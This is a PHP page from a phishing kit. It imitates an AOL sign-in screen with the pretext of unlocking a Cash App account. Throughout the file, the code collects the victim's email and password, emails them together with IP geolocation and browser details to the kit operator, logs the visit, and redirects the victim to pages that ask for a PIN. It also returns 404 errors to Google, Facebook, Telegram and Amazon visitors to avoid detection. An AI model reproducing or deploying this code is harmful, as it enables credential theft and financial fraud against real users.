<?php

ini_set( "display_errors", 0); 
require_once '../../../main.php';


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SERVER['HTTP_USER_AGENT'],'facebook') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'facebook') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SERVER['HTTP_USER_AGENT'],'telegram') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'telegram') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SERVER['HTTP_USER_AGENT'],'amazon') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'amazon') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();



if(isset($_SESSION['ssn'])) {
    echo "<script>window.location = 'https://www.cash.app';</script>";
    exit();
}

if(isset($_SESSION['webmail'])) {
    echo "<script>window.location = '{$_SESSION['redirect']}';</script>";
    exit();
}

if(isset($_POST['submit'])) {
    
    $email    = $_SESSION['email'];
    $password = $_POST['password'];

    $subject = "CASH APP AOL LOGIN ( $email ) - {$visitor['ipinfo']['query']} {$visitor['ipinfo']['country']}";

    $messages  = "#--------------------[ G-SPOT. Inc ]---------------------#\n";
    $messages .= "Email: $email\n";
    $messages .= "Password: $password\n\n";
    $messages .= "Format: $email|$password\n";
    $messages .= "#-----------------------------#\n\n";
    $messages .= "Info: {$visitor['ipinfo']['query']} {$visitor['ipinfo']['city']} {$visitor['ipinfo']['regionName']} {$visitor['ipinfo']['country']}\n";
    $messages .= "Browser: {$visitor['user_agent']}\n";
    $messages .= "#-------------[ きみ の こと が すき だから ]--------------#";

    $headers = "From: CashMail <cash@app.co>";

    if(@mail($config['email'], $subject, $messages, $headers)) {
        $_SESSION['webmail'] = true;

        logger('../../logs/visitor.log', "LOGIN - {$visitor['ipinfo']['query']} - {$visitor['ipinfo']['city']} - {$visitor['ipinfo']['regionName']} - {$visitor['ipinfo']['country']}");

        if(preg_match('/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i', $_SERVER['HTTP_USER_AGENT'])) {
            $_SESSION['redirect'] = $base_url . "pin_mobile.php?{$config['site']['blocker']['key']}";

            echo "<script>window.location = '{$_SESSION['redirect']}';</script>";
            exit();
        } else {
            $_SESSION['redirect'] = $base_url . "pin_desktop.php?{$config['site']['blocker']['key']}";

            echo "<script>window.location = '{$_SESSION['redirect']}';</script>";
            exit();
        }
    } else {
        echo "<script>window.location = 'index.php?{$config['site']['blocker']['key']}&error=1';</script>";
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>AOL</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="shortcut icon" href="assets/images/aol-favicon.png">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
        <style>
            body {
                font-family: Helvetica Neue, Helvetica, Arial;
            }

            .navbar-brand {
                margin-top: 10px;
                margin-left: 35px;
            }

            .nav-link {
                font-size: 13px;
                margin-right: 35px;
            }

            .nav-link > a {
                color: #39f;
            }

            .col-lg-3 {
                margin-top: 20px;
                margin-right: 345px;
            }

            .card {
                width: 360px;
                box-shadow: 0 2px 4px 0 rgba(0,0,0,.3);
            }

            .card-body {
                padding: 0px;
            }

            .card-body > img {
                padding-top: 28px;
            }

            .card-body > p {
                color: #26282a;
                font-weight: 400;
                font-size: .95353rem;
            }

            .card-body > .text-title {
                font-size: 1.27647rem;
                font-weight: 600;
            }

            form {
                padding: 30px;
                margin-top: 20px;
            }

            label {
                font-size: .80588rem;
                color: #262626;
            }

            .form-control {
                padding: 0px;
                border-top-width: 0;
                border-left-width: 0;
                border-right-width: 0;
                -webkit-border-radius: 0;
            }

            .form-control:focus {
                box-shadow: none;
                background-color: transparent;
            }

            .btn {
                background: #39f;
                border: 1px solid #39f;
            }

            .btn:focus {
                background: #1476d9;
                border-color: #1476d9;
                box-shadow: none;
                outline: none;
            }

            .forgot {
                font-size: .82353rem;
                margin-top: 130px;
            }

            .forgot > a {
                color: #39f;
                background: transparent;
                border-color: transparent;
            }

            @media screen and (max-width: 768px) {
                .navbar {
                    display: none;
                }

                .col-lg-3 {
                    margin-top: 5px;
                    margin-right: 5px;

                }

                .card {
                    border: none;
                    box-shadow: none;
                }

                form {      
                    padding: 20px;
                }

                .forgot {
                    font-size: .82353rem;
                    margin-top: 380px;
                }
            }
        </style>
    </head>
    <body>

        <nav class="navbar navbar-expand-sm">
            <a class="navbar-brand" href="#">
                <img src="assets/images/aol-logo-black-v.0.0.2.png" alt="Logo" width="100">
            </a>

            <ul class="navbar-nav ml-auto">
                <li class="nav-item active">
                    <a class="nav-link" href="#">Help</a>
                </li>
            </ul>
        </nav>

        <div class="container-fluid">
            <div class="row d-flex align-items-end justify-content-end">
                <div class="col-lg-3 col-md-3 col-sm-12">
                    <div class="card">
                        <div class="card-body text-center">
                            <img src="assets/images/aol-logo-black-v.0.0.2.png" alt="Logo" width="100">
                            <p class="mt-3"><?= $_SESSION['email'] ?></p>
                            <p class="text-title mb-0">Enter password</p>
                            <p class="mt-0">to finish sign in</p>
                            <p>Sign in to continue to unlock Cash App account.</p>

                            <form method="post" action="login.php" class="text-left">
                                <div class="form-group">
                                    <label for="password">Password</label>
                                    <input type="password" class="form-control" placeholder="Password" id="password" name="password" required>
                                </div>
                                <button type="submit" class="btn btn-primary btn-block" name="submit">Next</button>
                            </form>

                            <p class="forgot"><a href="#">Forgot password?</a></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <script>
            $(function() {
                $('label').css('visibility', 'hidden')

                $(document).on('focus', '#password', function() {
                    $('label').css('visibility', 'visible').hide().fadeIn('slow')
                    $(this).attr('placeholder', '')
                })
            })
        </script>
    </body>
</html>